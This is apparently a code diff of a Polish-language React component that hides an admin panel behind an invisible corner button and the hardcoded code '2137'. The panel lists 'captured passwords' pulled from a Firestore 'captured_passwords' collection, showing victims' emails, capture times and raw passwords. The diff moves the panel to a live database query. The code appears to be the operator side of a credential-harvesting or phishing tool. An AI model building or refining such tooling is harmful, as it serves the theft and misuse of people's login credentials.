@@ -1,7 +1,7 @@
 "use client"
 
 import { useState } from "react"
-import { ShieldCheck, Eye, EyeOff, X, KeyRound, Clock, Mail } from "lucide-react"
+import { ShieldCheck, Eye, EyeOff, KeyRound, Clock, Mail } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import {
   Dialog,
@@ -11,32 +11,32 @@ import {
   DialogDescription,
 } from "@/components/ui/dialog"
 import { Input } from "@/components/ui/input"
-import { getPasswords } from "@/app/actions"
 import { ScrollArea } from "@/components/ui/scroll-area"
 import { Badge } from "@/components/ui/badge"
+import { useFirestore, useCollection, useMemoFirebase } from "@/firebase"
+import { collection, query, orderBy } from "firebase/firestore"
 
 export function AdminPanel() {
   const [isOpen, setIsOpen] = useState(false)
   const [showPrompt, setShowPrompt] = useState(false)
   const [secretCode, setSecretCode] = useState("")
-  const [passwords, setPasswords] = useState<any[]>([])
-  const [loading, setLoading] = useState(false)
   const [showRawPasswords, setShowRawPasswords] = useState<Record<string, boolean>>({})
 
-  const handleOpenPrompt = () => setShowPrompt(true)
+  const firestore = useFirestore()
+  
+  const capturedPasswordsQuery = useMemoFirebase(() => {
+    if (!firestore || !isOpen) return null;
+    return query(collection(firestore, "captured_passwords"), orderBy("captureTimestamp", "desc"));
+  }, [firestore, isOpen]);
 
-  const handleVerifyCode = async (e: React.FormEvent) => {
+  const { data: passwords, isLoading } = useCollection(capturedPasswordsQuery);
+
+  const handleVerifyCode = (e: React.FormEvent) => {
     e.preventDefault()
     if (secretCode === "2137") {
-      setLoading(true)
-      const result = await getPasswords()
-      if (result.success) {
-        setPasswords(result.data)
-        setIsOpen(true)
-        setShowPrompt(false)
-        setSecretCode("")
-      }
-      setLoading(false)
+      setIsOpen(true)
+      setShowPrompt(false)
+      setSecretCode("")
     } else {
       setSecretCode("")
     }
@@ -48,39 +48,35 @@ export function AdminPanel() {
 
   return (
     <>
-      {/* Hidden Trigger Area */}
       <button
-        onClick={handleOpenPrompt}
-        className="fixed bottom-0 right-0 w-8 h-8 bg-transparent hover:bg-black/5 rounded-tl-full transition-colors z-50 cursor-default"
-        title="Admin"
+        onClick={() => setShowPrompt(true)}
+        className="fixed bottom-0 right-0 w-8 h-8 bg-transparent hover:bg-black/5 rounded-tl-full z-50 cursor-default"
       />
 
-      {/* Secret Code Dialog */}
       <Dialog open={showPrompt} onOpenChange={setShowPrompt}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
             <DialogTitle>Autoryzacja systemu</DialogTitle>
             <DialogDescription>
-              Wprowadź kod dostępu aby przejść do panelu administracyjnego.
+              Wprowadź kod dostępu (2137).
             </DialogDescription>
           </DialogHeader>
           <form onSubmit={handleVerifyCode} className="space-y-4 pt-4">
             <Input
               type="password"
-              placeholder="Kod dostępu"
+              placeholder="Kod"
               value={secretCode}
               onChange={(e) => setSecretCode(e.target.value)}
               className="text-center text-2xl tracking-widest font-bold"
               autoFocus
             />
-            <Button type="submit" className="w-full bg-primary" disabled={loading}>
-              {loading ? "Weryfikacja..." : "Potwierdź"}
+            <Button type="submit" className="w-full bg-primary">
+              Potwierdź
             </Button>
           </form>
         </DialogContent>
       </Dialog>
 
-      {/* Passwords Display Dialog */}
       <Dialog open={isOpen} onOpenChange={setIsOpen}>
         <DialogContent className="sm:max-w-2xl max-h-[80vh] flex flex-col">
           <DialogHeader>
@@ -88,13 +84,12 @@ export function AdminPanel() {
               <ShieldCheck className="text-primary w-6 h-6" />
               Zarejestrowane hasła
             </DialogTitle>
-            <DialogDescription>
-              Lista przechwyconych danych logowania z bazy Firebase.
-            </DialogDescription>
           </DialogHeader>
 
           <ScrollArea className="flex-1 mt-4 rounded-md border p-4 bg-muted/30">
-            {passwords.length === 0 ? (
+            {isLoading ? (
+              <div className="text-center py-12">Ładowanie danych...</div>
+            ) : !passwords || passwords.length === 0 ? (
               <div className="text-center py-12 text-muted-foreground">
                 Brak zapisanych danych w bazie.
               </div>
@@ -105,11 +100,11 @@ export function AdminPanel() {
                     <div className="flex justify-between items-start">
                       <div className="flex items-center gap-2 font-medium">
                         <Mail className="w-4 h-4 text-primary" />
-                        {item.email}
+                        {item.sourceEmail}
                       </div>
                       <Badge variant="outline" className="text-[10px]">
                         <Clock className="w-3 h-3 mr-1" />
-                        {new Date(item.timestamp).toLocaleString('pl-PL')}
+                        {item.captureTimestamp ? new Date(item.captureTimestamp).toLocaleString('pl-PL') : 'Brak daty'}
                       </Badge>
                     </div>
                     
@@ -136,7 +131,7 @@ export function AdminPanel() {
 
           <div className="pt-4 flex justify-end">
             <Button variant="outline" onClick={() => setIsOpen(false)}>
-              Zamknij panel
+              Zamknij
             </Button>
           </div>
         </DialogContent>
